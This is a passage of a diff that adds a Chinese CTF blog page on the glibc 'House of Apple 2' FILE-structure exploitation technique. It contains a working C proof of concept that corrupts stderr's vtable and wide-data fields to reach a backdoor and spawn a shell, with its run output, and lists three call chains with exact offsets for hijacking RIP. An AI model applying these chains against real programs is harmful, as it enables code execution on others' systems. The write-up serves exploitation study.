class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">char</span> *p1 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">char</span> *p2 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate two 0x200 chunks&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">size_t</span> puts_addr = (<span class="keyword">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="keyword">void</span> *)puts_addr);</span><br><span class="line">    <span class="keyword">size_t</span> libc_base_addr = puts_addr - <span class="number">0x84420</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc base address: %p\n&quot;</span>, (<span class="keyword">void</span> *)libc_base_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">size_t</span> _IO_2_1_stderr_addr = libc_base_addr + <span class="number">0x1ed5c0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_2_1_stderr_ address: %p\n&quot;</span>, (<span class="keyword">void</span> *)_IO_2_1_stderr_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">size_t</span> _IO_wstrn_jumps_addr = libc_base_addr + <span class="number">0x1e8c60</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wstrn_jumps address: %p\n&quot;</span>, (<span class="keyword">void</span> *)_IO_wstrn_jumps_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">char</span> *stderr2 = (<span class="keyword">char</span> *)_IO_2_1_stderr_addr;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_flags to 0x800&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)stderr2 = <span class="number">0x800</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: change stderr-&gt;_mode to 1&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(stderr2 + <span class="number">0xc0</span>) = <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: change stderr-&gt;vtable to _IO_wstrn_jumps-0x20&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(stderr2 + <span class="number">0xd8</span>) = _IO_wstrn_jumps_addr<span class="number">-0x20</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: replace stderr-&gt;_wide_data with the allocated chunk p1&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(stderr2 + <span class="number">0xa0</span>) = (<span class="keyword">size_t</span>)p1;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: set stderr-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(p1 + <span class="number">0xe0</span>) = (<span class="keyword">size_t</span>)p2;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 6: set stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_ptr &gt;  stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_base&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(p1 + <span class="number">0x20</span>) = (<span class="keyword">size_t</span>)<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 7: put backdoor at fake _wide_vtable-&gt;_overflow&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(p2 + <span class="number">0x18</span>) = (<span class="keyword">size_t</span>)(&amp;backdoor);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 8: call fflush(stderr) to trigger backdoor func&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stderr</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>结果：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test </span><br><span class="line">[*] allocate two <span class="number">0x200</span> chunks</span><br><span class="line">[*] <span class="built_in">puts</span> address: <span class="number">0x7fe29386f420</span></span><br><span class="line">[*] libc base address: <span class="number">0x7fe2937eb000</span></span><br><span class="line">[*] _IO_2_1_stderr_ address: <span class="number">0x7fe2939d85c0</span></span><br><span class="line">[*] _IO_wstrn_jumps address: <span class="number">0x7fe2939d3c60</span></span><br><span class="line">[+] step <span class="number">1</span>: change <span class="built_in">stderr</span>-&gt;_flags to <span class="number">0x800</span></span><br><span class="line">[+] step <span class="number">2</span>: change <span class="built_in">stderr</span>-&gt;_mode to <span class="number">1</span></span><br><span class="line">[+] step <span class="number">3</span>: change <span class="built_in">stderr</span>-&gt;vtable to _IO_wstrn_jumps<span class="number">-0x20</span></span><br><span class="line">[+] step <span class="number">4</span>: replace <span class="built_in">stderr</span>-&gt;_wide_data with the allocated chunk p1</span><br><span class="line">[+] step <span class="number">5</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2</span><br><span class="line">[+] step <span class="number">6</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_ptr &gt;  <span class="built_in">stderr</span>-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_base</span><br><span class="line">[+] step <span class="number">7</span>: put backdoor at fake _wide_vtable-&gt;_overflow</span><br><span class="line">[+] step <span class="number">8</span>: <span class="function">call <span class="title">fflush</span><span class="params">(<span class="built_in">stderr</span>)</span> to trigger backdoor func</span></span><br><span class="line"><span class="function">$ whoami</span></span><br><span class="line"><span class="function">yhellow</span></span><br></pre></td></tr></table></figure>
+<p>下面给出几条好用的调用链及其利用方式：</p>
+<p>利用 <code>_IO_wfile_overflow</code> 函数控制程序执行流</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_overflow -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>_flags</code> = <code>~(2 | 0x8 | 0x800)</code></li>
+<li><code>vtable</code> = <code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code> 的地址（加减偏移）</li>
+<li><code>_wide_data</code> = 可控堆地址<code>A</code>（即满足 <code>*(fp+0xa0)=A</code>）</li>
+<li><code>_wide_data-&gt;_IO_write_base</code> = <code>0</code>（即满足 <code>*(A+0x18)=0</code>）</li>
+<li><code>_wide_data-&gt;_IO_buf_base</code> = <code>0</code>（即满足 <code>*(A+0x30)=0</code>）</li>
+<li><code>_wide_data-&gt;_wide_vtable</code> = 可控堆地址<code>B</code>（即满足 <code>*(A+0xe0)=B</code>）</li>
+<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> = 地址<code>C</code>，用于劫持 <code>RIP</code>（即满足 <code>*(B+0x68)=C</code>）</li>
+</ul>
+<p>利用 <code>_IO_wfile_underflow_mmap</code> 函数控制程序执行流</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>_flags</code> = <code>~4</code></li>
+<li><code>vtable</code> 设置为 <code>_IO_wfile_jumps_mmap</code> 地址（加减偏移）</li>
+<li><code>_IO_read_end &gt; _IO_read_ptr</code>（不进入调用）</li>
+<li><code>_wide_data</code> 设置为可控堆地址 <code>A</code>（即满足<code>*(fp+0xa0)=A</code>）</li>
+<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>（即满足<code>*A&gt;=*(A+8)</code>）</li>
+<li><code>_wide_data-&gt;_IO_buf_base</code> = <code>0</code>（即满足<code>*(A+0x30)=0</code>）</li>
+<li><code>_wide_data-&gt;_IO_save_base</code> = <code>0</code>（即满足<code>*(A+0x40)=0</code>）</li>
+<li><code>_wide_data-&gt;_wide_vtable</code> = 可控堆地址<code>B</code>（即满足<code>*(A+0xe0)=B</code>）</li>
+<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> = 地址<code>C</code>，用于劫持 <code>RIP</code>（即满足<code>*(B+0x68)=C</code>）</li>
+<li>PS：这条链执行的条件是调用到 <code>_IO_wdefault_xsgetn</code> 时 <code>RDX</code> 寄存器不能为“0”</li>
+</ul>
+<p>利用 <code>_IO_wdefault_xsgetn</code> 函数控制程序执行流</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_wdefault_xsgetn -&gt; __wunderflow -&gt; _IO_switch_to_wget_mode -&gt; _IO_WOVERFLOW -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x18</span>)(fp)</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>_flags</code> = <code>0x800</code></li>
+<li><code>vtable</code> = <code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code> 地址（加减偏移）</li>
+<li><code>_mode</code> &gt; <code>0</code>（即满足<code>*(fp+0xc0)&gt;0</code>）</li>
+<li><code>_wide_data</code> = 可控堆地址<code>A</code>（即满足<code>*(fp+0xa0)=A</code>）</li>
+<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code> = <code>0</code>（即满足 <code>*(A+8)=*A</code>）</li>
+<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>（即满足<code>*(A+0x20)&gt;*(A+0x18)</code>）</li>
+<li><code>_wide_data-&gt;_wide_vtable</code> = 可控堆地址<code>B</code>（即满足<code>*(A+0xe0)=B</code>）</li>
+<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code> = 地址<code>C</code>，用于劫持<code>RIP</code>（即满足<code>*(B+0x18)=C</code>）</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/House-Of-Apple/" rel="tag"><i class="fa fa-tag"></i> House Of Apple</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/11/05/myGDB/" rel="prev" title="myGDB">
+      <i class="fa fa-chevron-left"></i> myGDB
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#House-Of-Apple"><span class="nav-number">1.</span> <span class="nav-text">House Of Apple</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-Of-Apple-%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">House Of Apple 原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-Of-Apple-%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF"><span class="nav-number">3.</span> <span class="nav-text">House Of Apple 利用姿势</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-Of-Apple2-%E5%8E%9F%E7%90%86"><span class="nav-number">4.</span> <span class="nav-text">House Of Apple2 原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-Of-Apple2-%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF"><span class="nav-number">5.</span> <span class="nav-text">House Of Apple2 利用姿势</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yhellow"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">yhellow</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">185</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">117</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yhellow</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">2.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">36:35</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
